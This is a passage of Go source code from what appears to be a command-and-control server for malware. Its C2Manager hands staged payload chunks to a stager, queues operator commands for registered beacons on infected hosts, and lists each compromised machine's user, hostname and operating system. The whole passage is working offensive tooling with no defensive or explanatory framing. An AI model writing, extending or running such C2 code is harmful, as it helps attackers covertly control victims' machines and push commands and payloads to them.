	// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
	// The stager expects: CHUNK|<base64_data>
	return fmt.Sprintf("CHUNK|%s", chunk)
}

// AddTask adds a new task for a specific beacon
func (c2 *C2Manager) AddTask(beaconID, command string) string {
	c2.mutex.Lock()
	defer c2.mutex.Unlock()

	// Generate task ID
	c2.taskCounter++
	taskID := fmt.Sprintf("T%04d", c2.taskCounter)

	task := &Task{
		ID:        taskID,
		BeaconID:  beaconID,
		Command:   command,
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	c2.tasks[taskID] = task

	// Add to beacon's task queue
	if beacon, exists := c2.beacons[beaconID]; exists {
		beacon.TaskQueue = append(beacon.TaskQueue, *task)
		logf("[C2] Added task %s for beacon %s: %s", taskID, beaconID, command)
		return taskID
	}

	logf("[C2] ERROR: Beacon %s not found when adding task %s", beaconID, taskID)
	return ""
}

// GetBeacons returns all registered beacons
func (c2 *C2Manager) GetBeacons() map[string]*Beacon {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Beacon)
	for id, beacon := range c2.beacons {
		result[id] = beacon
	}
	return result
}

// GetTasks returns all tasks
func (c2 *C2Manager) GetTasks() map[string]*Task {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*Task)
	for id, task := range c2.tasks {
		result[id] = task
	}
	return result
}

// GetExpectedResults returns a copy of expected results for console display
func (c2 *C2Manager) GetExpectedResults() map[string]*ExpectedResult {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	result := make(map[string]*ExpectedResult)
	for id, expected := range c2.expectedResults {
		result[id] = expected
	}
	return result
}

// PrintStatus prints the current C2 status
func (c2 *C2Manager) PrintStatus() {
	c2.mutex.RLock()
	defer c2.mutex.RUnlock()

	fmt.Printf("\n=== C2 Status ===\n")
	fmt.Printf("Active Beacons: %d\n", len(c2.beacons))

	for _, beacon := range c2.beacons {
		fmt.Printf("  [%s] %s@%s (%s/%s) - Last seen: %s - Queue: %d tasks\n",
			beacon.ID, beacon.Username, beacon.Hostname, beacon.OS, beacon.Arch,
			beacon.LastSeen.Format("15:04:05"), len(beacon.TaskQueue))
	}

	pendingTasks := 0
	completedTasks := 0
	for _, task := range c2.tasks {
		switch task.Status {
		case "pending", "sent":
			pendingTasks++
		case "completed":
			completedTasks++
		}
	}

	fmt.Printf("Tasks - Pending: %d, Completed: %d\n", pendingTasks, completedTasks)
	fmt.Printf("==================\n")
}
